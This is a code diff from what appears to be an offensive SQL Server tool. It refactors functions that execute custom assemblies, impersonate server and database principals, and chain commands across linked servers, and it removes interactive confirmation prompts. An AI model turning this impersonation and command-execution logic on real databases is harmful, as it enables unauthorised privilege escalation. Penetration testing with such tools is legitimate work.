+            self.add_rev2self_query(chain_id, Queries.DROP_FUNCTION.format(function_name=function_name),
+                                    template=add_function['template'], iterations=add_function['iterations'])
         function_query = Queries.FUNCTION_EXECUTION.format(function_name=function_name, command=command)
-
-        if not self.build_chain(function_query, linked_server, method="OpenQuery", wait=False):
+        function_execution = self.build_chain(chain_id, function_query, method="OpenQuery", wait=wait)
+        if not function_execution['is_success']:
             LOG.error(f"Failed to execute custom assembly")
-            return False
+            return None
         LOG.info(f"Successfully executed custom assembly")
-        return True
+        return function_execution
 
-    def impersonate_as(self, linked_server: str, principal_type: Literal['server', 'database']) -> bool:
+    def impersonate_as(self, chain_id: str) -> list:
         """
         This function is responsible to impersonate as a server or database principal.
         """
-        self.execute_as = ""
-        if linked_server not in self.state['servers_info'].keys():
-            return False
 
-        for user in self.state['servers_info'][linked_server][f'{principal_type}_principals']:
-            if user in self.state['servers_info'][linked_server][f'{principal_type}_principals_history']:
-                continue
+        server_info = self.state['servers_info'][chain_id]
+        chain_str = self.generate_chain_str(chain_id)
+        for principal_type in ['server', 'database']:
+            for user in server_info[f'{principal_type}_principals']:
 
-            if not self.auto_yes:
-                if utilities.receive_answer(f"Try to impersonate as {user} {principal_type} "
-                                            f"principal on {linked_server}?",
-                                            ["y", "n"], 'n'):
-                    LOG.info(f"Skipping impersonation as {user} server principal on {linked_server}")
-                    continue
+                LOG.info(f"Trying to impersonate as {user} {principal_type} principal on {chain_str}")
+                # Log the server principal in order to avoid infinite loop
 
-            LOG.info(f"Trying to impersonate as {user} {principal_type} principal on {linked_server}")
-            # Log the server principal in order to avoid infinite loop
+                if principal_type == 'server':
+                    query = Queries.IMPERSONATE_AS_SERVER_PRINCIPAL.format(username=user)
+                else:
+                    query = Queries.IMPERSONATE_AS_DATABASE_PRINCIPAL.format(username=user)
 
-            if principal_type == 'server':
-                query = Queries.IMPERSONATE_AS_SERVER_PRINCIPAL.format(username=user)
-            else:
-                query = Queries.IMPERSONATE_AS_DATABASE_PRINCIPAL.format(username=user)
+                yield query
 
-            self.add_to_server_state(linked_server, f'{principal_type}_principals_history', user)
-            if self.build_chain(query, linked_server, method="exec_at")['is_success']:
-                LOG.info(f"Successfully impersonated as {user} {principal_type} principal on {linked_server}")
-                self.execute_as = query
-                return True
-        return False
-
-    def add_rev2self_query(self, linked_server: str, query: str) -> None:
+    def add_rev2self_query(self, chain_id: str, query: str, template: str, iterations: int) -> None:
         """
         This function is responsible to add a command to the rev2self queue.
         """
-        if linked_server not in self.rev2self.keys():
-            self.rev2self[linked_server] = []
-        self.rev2self[linked_server].append(self.generate_query(query, linked_server, method="exec_at"))
 
-    def procedure_runner(self, func: Callable, args: list, **kwargs) -> bool:
-        """
-        This function is responsible to attempt to run a procedure through local or link server.
-        This function will try  to run the procedure through the following methods if no success:
-        1. Execute the procedure locally.
-        2. Impersonate as a server principal and execute the procedure.
-        3. Impersonate as a database principal and execute the procedure.
-
-        """
-        self.execute_as = ""
-        linked_server = kwargs['linked_server']
-        if self.can_impersonate(linked_server):
-            if self.auto_yes or utilities.receive_answer(f"The {linked_server} server can escalate privileges, "
-                                                         f"do you want to continue with the current privileges?",
-                                                         ['y', 'n'], 'y'):
-                if func(*args, **kwargs):
-                    return True
-        else:
-            if func(*args, **kwargs):
-                return True
-
-        while self.impersonate_as(linked_server, principal_type='server'):
-            if func(*args, **kwargs):
-                return True
-
-        while self.impersonate_as(linked_server, principal_type='database'):
-            if func(*args, **kwargs):
-                return True
-
-        return False
-
-    def procedure_chain_builder(self, func: Callable, args: list, **kwargs) -> bool:
-        """
-        This function is responsible to build a procedure chain.
-        """
-        if 'linked_server' not in kwargs.keys():
-            LOG.error("No linked server was provided")
-            return False
-
-        if kwargs['linked_server'] == self.state['local_hostname']:
-            retval = self.procedure_runner(func, args, **kwargs)
-            if retval:
-                LOG.info(f"Successfully executed {func.__name__} on {kwargs['linked_server']}")
-                return True
-
-            LOG.error(f"{func.__name__} cannot be executed on {kwargs['linked_server']}")
-            LOG.info("Trying to find a linkable server chain")
-
-        if self.chain_id:
-            filtered_servers = self.filter_server_by_chain_id(self.chain_id)
-        else:
-            filtered_servers = self.filter_server_by_chain_str(kwargs['linked_server'])
-
-        for results in filtered_servers:
-            LOG.info(f"Trying to execute {func.__name__} on {results['chain_str']}")
-            kwargs['linked_server'] = results['chain_str']
-            if self.procedure_runner(func, args, **kwargs):
-                LOG.info(f"Successfully executed {func.__name__} on {results['chain_str']}")
-                return True
-            LOG.warning(f"Failed to execute {func.__name__} on {results['chain_str']}")
-
-        return False
+        if chain_id not in self.rev2self.keys():
+            self.rev2self[chain_id] = []
+        self.rev2self[chain_id].append(utilities.build_payload_from_template(template, query, iterations))
